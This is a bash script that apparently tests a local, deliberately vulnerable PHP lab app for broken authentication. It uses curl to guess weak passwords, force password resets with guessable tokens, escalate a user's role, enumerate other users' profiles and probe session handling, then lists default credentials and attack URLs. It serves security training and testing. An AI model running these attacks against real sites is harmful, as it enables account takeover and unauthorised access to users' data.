#!/bin/bash

# Broken Authentication Testing Script
echo "🔐 Broken Authentication Vulnerability Scanner"
echo "=============================================="

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Base URL
BASE_URL="http://localhost:8081"

echo -e "${YELLOW}Testing target: $BASE_URL${NC}"
echo ""

# Function to test authentication bypass
test_auth_bypass() {
    echo -e "${BLUE}1. Testing Authentication Bypass${NC}"
    
    # Test weak credentials
    weak_passwords=("admin" "password" "123456" "qwerty" "admin123")
    
    for password in "${weak_passwords[@]}"; do
        echo "Testing admin:$password"
        response=$(curl -s -X POST "$BASE_URL/index.php" \
            -d "username=admin" \
            -d "password=$password" \
            2>/dev/null)
        
        if echo "$response" | grep -q "Login successful"; then
            echo -e "${GREEN}✅ VULNERABLE: Weak password found - admin:$password${NC}"
        fi
    done
    echo "---"
}

# Function to test session fixation
test_session_fixation() {
    echo -e "${BLUE}2. Testing Session Fixation${NC}"
    
    # Test if session ID can be fixed
    fixed_session="FIXED_SESSION_12345"
    response=$(curl -s "$BASE_URL/index.php?sessionid=$fixed_session" \
        -c cookies.txt \
        2>/dev/null)
    
    if echo "$response" | grep -q "sessionid"; then
        echo -e "${GREEN}✅ VULNERABLE: Session fixation possible${NC}"
        echo "Fixed session ID: $fixed_session"
    else
        echo -e "${RED}❌ Session fixation not detected${NC}"
    fi
    echo "---"
}

# Function to test password reset vulnerabilities
test_password_reset() {
    echo -e "${BLUE}3. Testing Password Reset Vulnerabilities${NC}"
    
    # Test username enumeration
    echo "Testing username enumeration..."
    response=$(curl -s -X POST "$BASE_URL/forgot-password.php" \
        -d "username=admin" \
        2>/dev/null)
    
    if echo "$response" | grep -q "token generated"; then
        echo -e "${GREEN}✅ VULNERABLE: Username enumeration possible${NC}"
        
        # Extract token if shown
        token=$(echo "$response" | grep -oP 'token generated: <strong>\K\d+' | head -1)
        if [ -n "$token" ]; then
            echo "Token disclosed: $token"
        fi
    fi
    
    # Test predictable tokens
    echo "Testing predictable reset tokens..."
    common_tokens=("123456" "111111" "000001" "999999" "654321")
    
    for token in "${common_tokens[@]}"; do
        response=$(curl -s -X POST "$BASE_URL/forgot-password.php?step=2" \
            -d "token=$token" \
            -d "new_password=hacked123" \
            2>/dev/null)
        
        if echo "$response" | grep -q "Password reset successful"; then
            echo -e "${GREEN}✅ VULNERABLE: Predictable token accepted - $token${NC}"
        fi
    done
    echo "---"
}

# Function to test privilege escalation
test_privilege_escalation() {
    echo -e "${BLUE}4. Testing Privilege Escalation${NC}"
    
    # First login as regular user
    echo "Logging in as regular user..."
    session_cookie=$(curl -s -X POST "$BASE_URL/index.php" \
        -d "username=john" \
        -d "password=password" \
        -c - | grep PHPSESSID | awk '{print $7}')
    
    if [ -n "$session_cookie" ]; then
        echo "Session obtained: $session_cookie"
        
        # Try to access admin panel
        echo "Testing admin panel access..."
        response=$(curl -s "$BASE_URL/admin.php" \
            -b "PHPSESSID=$session_cookie" \
            2>/dev/null)
        
        if echo "$response" | grep -q "User Management"; then
            echo -e "${GREEN}✅ VULNERABLE: Admin panel accessible without proper authorization${NC}"
        fi
        
        # Try privilege escalation via profile
        echo "Testing role escalation..."
        response=$(curl -s -X POST "$BASE_URL/profile.php" \
            -b "PHPSESSID=$session_cookie" \
            -d "action=escalate_privileges" \
            -d "role=admin" \
            2>/dev/null)
        
        if echo "$response" | grep -q "Role updated"; then
            echo -e "${GREEN}✅ VULNERABLE: Client-side privilege escalation possible${NC}"
        fi
    fi
    echo "---"
}

# Function to test IDOR vulnerabilities
test_idor() {
    echo -e "${BLUE}5. Testing Insecure Direct Object References${NC}"
    
    # Login first
    session_cookie=$(curl -s -X POST "$BASE_URL/index.php" \
        -d "username=john" \
        -d "password=password" \
        -c - | grep PHPSESSID | awk '{print $7}')
    
    if [ -n "$session_cookie" ]; then
        # Test accessing other users' profiles
        for user_id in {1..5}; do
            response=$(curl -s "$BASE_URL/profile.php?user_id=$user_id" \
                -b "PHPSESSID=$session_cookie" \
                2>/dev/null)
            
            if echo "$response" | grep -q "Profile Information"; then
                username=$(echo "$response" | grep -oP '<strong>Username:</strong> \K[^<]+' | head -1)
                if [ -n "$username" ]; then
                    echo -e "${GREEN}✅ VULNERABLE: Can access user ID $user_id ($username)${NC}"
                fi
            fi
        done
    fi
    echo "---"
}

# Function to test session management
test_session_management() {
    echo -e "${BLUE}6. Testing Session Management${NC}"
    
    # Test logout vulnerability
    echo "Testing incomplete logout..."
    
    # Login
    login_response=$(curl -s -X POST "$BASE_URL/index.php" \
        -d "username=admin" \
        -d "password=admin" \
        -c cookies.txt \
        2>/dev/null)
    
    if echo "$login_response" | grep -q "Login successful"; then
        # Get session ID before logout
        session_before=$(grep PHPSESSID cookies.txt | awk '{print $7}')
        
        # Logout
        logout_response=$(curl -s "$BASE_URL/logout.php" \
            -b cookies.txt \
            -c cookies_after.txt \
            2>/dev/null)
        
        # Check if session ID changed
        session_after=$(grep PHPSESSID cookies_after.txt | awk '{print $7}' 2>/dev/null)
        
        if [ "$session_before" = "$session_after" ] || [ -n "$session_after" ]; then
            echo -e "${GREEN}✅ VULNERABLE: Session ID not properly destroyed on logout${NC}"
            echo "Session before logout: $session_before"
            echo "Session after logout: $session_after"
        fi
    fi
    echo "---"
}

# Function to test brute force protection
test_brute_force() {
    echo -e "${BLUE}7. Testing Brute Force Protection${NC}"
    
    echo "Attempting multiple failed logins..."
    for i in {1..10}; do
        response=$(curl -s -X POST "$BASE_URL/index.php" \
            -d "username=admin" \
            -d "password=wrong_password_$i" \
            2>/dev/null)
        
        if echo "$response" | grep -q "account locked\|too many attempts"; then
            echo -e "${RED}❌ Brute force protection detected after $i attempts${NC}"
            break
        elif [ $i -eq 10 ]; then
            echo -e "${GREEN}✅ VULNERABLE: No brute force protection - 10 attempts allowed${NC}"
        fi
    done
    echo "---"
}

# Main execution
echo "🧪 Starting Broken Authentication Tests..."
echo ""

test_auth_bypass
test_session_fixation
test_password_reset
test_privilege_escalation
test_idor
test_session_management
test_brute_force

echo ""
echo "🎯 Testing Complete!"
echo ""
echo -e "${YELLOW}Manual Testing URLs:${NC}"
echo "- Main App: $BASE_URL"
echo "- Registration: $BASE_URL/register.php"
echo "- Password Reset: $BASE_URL/forgot-password.php"
echo "- Profile: $BASE_URL/profile.php"
echo "- Admin Panel: $BASE_URL/admin.php"
echo ""
echo -e "${YELLOW}Common Attack Vectors:${NC}"
echo "1. Session Fixation: $BASE_URL/index.php?sessionid=ATTACKER_SESSION"
echo "2. IDOR: $BASE_URL/profile.php?user_id=1"
echo "3. Privilege Escalation: Use profile form to change role"
echo "4. Weak Passwords: admin/admin, john/password, jane/123456"
echo "5. Predictable Tokens: 123456, 111111, 654321"
echo ""
echo -e "${GREEN}Happy Ethical Hacking! 🔐${NC}"

# Cleanup
rm -f cookies.txt cookies_after.txt 2>/dev/null
